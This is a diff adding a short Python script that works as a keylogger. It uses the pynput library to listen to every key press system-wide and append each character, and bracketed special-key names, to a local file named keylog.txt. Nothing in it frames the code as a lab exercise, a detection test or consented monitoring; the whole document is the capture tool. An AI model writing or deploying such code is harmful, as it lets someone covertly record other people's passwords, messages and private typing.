@@ -1,0 +1,22 @@
+from pynput import keyboard
+
+# Log file to store keystrokes
+log_file = "keylog.txt"
+
+def log_keystroke(key):
+    try:
+        with open(log_file, "a") as f:
+            # Write the pressed key to the log file
+            f.write(f"{key.char}")
+    except AttributeError:
+        # Handle special keys (like enter, shift, etc.)
+        if key == keyboard.Key.space:
+            with open(log_file, "a") as f:
+                f.write(" ")
+        else:
+            with open(log_file, "a") as f:
+                f.write(f" [{key}] ")
+
+# Start listening to keyboard events
+with keyboard.Listener(on_press=log_keystroke) as listener:
+    listener.join()
